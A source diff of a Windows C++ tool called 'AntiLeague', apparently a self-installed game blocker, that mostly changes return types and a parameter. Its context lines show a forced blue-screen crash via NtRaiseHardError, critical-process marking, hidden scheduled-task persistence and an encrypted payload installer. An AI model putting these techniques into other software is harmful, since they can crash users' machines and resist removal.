@@ -6,7 +6,7 @@ void BSOD()
 {
     BOOLEAN pv;
     ULONG response;
-
+    
     RtlAdjustPrivilege(19, TRUE, FALSE, &pv);
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, NULL, NULL, NULL, 6, &response);
 }
@@ -44,7 +44,7 @@ extern "C"
         RtlSetProcessIsCritical(FALSE, NULL, FALSE);
     }
 
-    bool AntiLeague()
+    void AntiLeague()
     {
         CoInitializeEx(NULL, COINIT_MULTITHREADED);
         CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
@@ -64,13 +64,13 @@ extern "C"
                 if (value == NULL)
                 {
                     CoUninitialize();
-                    return false;
+                    return;
                 }
             }
             else
             {
                 CoUninitialize();
-                return false;
+                return;
             }
         }
         #endif
@@ -85,13 +85,13 @@ extern "C"
                 if (value == NULL)
                 {
                     CoUninitialize();
-                    return false;
+                    return;
                 }
             }
             else
             {
                 CoUninitialize();
-                return false;
+                return;
             }
         }
         #endif
@@ -109,13 +109,13 @@ extern "C"
                 if (wcscmp(path.c_str(), szExeFileName) != NULL)
                 {
                     CoUninitialize();
-                    return false;
+                    return;
                 }
             }
             else
             {
                 CoUninitialize();
-                return false;
+                return;
             }
         }
         #endif
@@ -144,7 +144,7 @@ extern "C"
                     pService->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 ITaskDefinition* pTask = NULL;
@@ -164,7 +164,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 VARIANT_BOOL pStopIfOnBatteries;
@@ -176,7 +176,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 BSTR pExecutionTimeLimit;
@@ -188,7 +188,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 VARIANT_BOOL pHidden;
@@ -200,7 +200,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 VARIANT_BOOL pAllowHardTerminate;
@@ -212,7 +212,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 VARIANT_BOOL pRunOnlyIfIdle;
@@ -224,7 +224,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 VARIANT_BOOL pRunOnlyIfNetworkAvailable;
@@ -236,7 +236,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 pSettings->Release();
@@ -257,7 +257,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 VARIANT_BOOL pTriggerEnabled;
@@ -269,7 +269,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 BSTR pTriggerExecutionTimeLimit;
@@ -281,7 +281,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 BSTR pStart;
@@ -293,7 +293,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 BSTR pEnd;
@@ -305,7 +305,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 ILogonTrigger* pLogonTrigger = NULL;
@@ -321,7 +321,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 BSTR pUser;
@@ -333,7 +333,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 pLogonTrigger->Release();
@@ -350,7 +350,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 TASK_LOGON_TYPE pType;
@@ -362,7 +362,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 BSTR pGroup;
@@ -374,7 +374,7 @@ extern "C"
                     pTask->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 pPrincipal->Release();
@@ -395,7 +395,7 @@ extern "C"
                     pAction->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 IExecAction* pExecAction = NULL;
@@ -413,7 +413,7 @@ extern "C"
                     pExecAction->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 BSTR pArgument;
@@ -424,7 +424,7 @@ extern "C"
                     pExecAction->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 BSTR pWorkingDirectory;
@@ -435,7 +435,7 @@ extern "C"
                     pExecAction->Release();
                     CoUninitialize();
 
-                    return false;
+                    return;
                 }
 
                 pExecAction->Release();
@@ -443,7 +443,7 @@ extern "C"
             catch (...)
             {
                 CoUninitialize();
-                return false;
+                return;
             }
         #endif
 
@@ -459,15 +459,11 @@ extern "C"
             continue;
         }
 
-        /*
-            Unreachable
-        */
-
+        //Unreachable
         CoUninitialize();
-        return true;
     }
 
-    void Init(const std::string& payloadPath, const std::string& payload, const std::string& dec_key)
+    void Init(const std::string* payloadPath, const std::string& payload, const std::string& dec_key)
     {
         wchar_t desktop[MAX_PATH];
         SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, desktop);
@@ -492,7 +488,7 @@ extern "C"
                 GetModuleFileName(NULL, szExeFileName, MAX_PATH);
 
                 MoveFileEx(szExeFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-                MoveFileExA(payloadPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+                MoveFileExA(payloadPath->c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                 _wunlink(uninstall.c_str());
 
                 MessageBox(NULL, L"AntiLeague has been successfully uninstalled.", L"Uninstaller", MB_OK);
@@ -515,7 +511,6 @@ extern "C"
 
         Installer Installer(payload, dec_key);
         Installer.Install();
-        isFirstInstance = true;
     }
 }
 
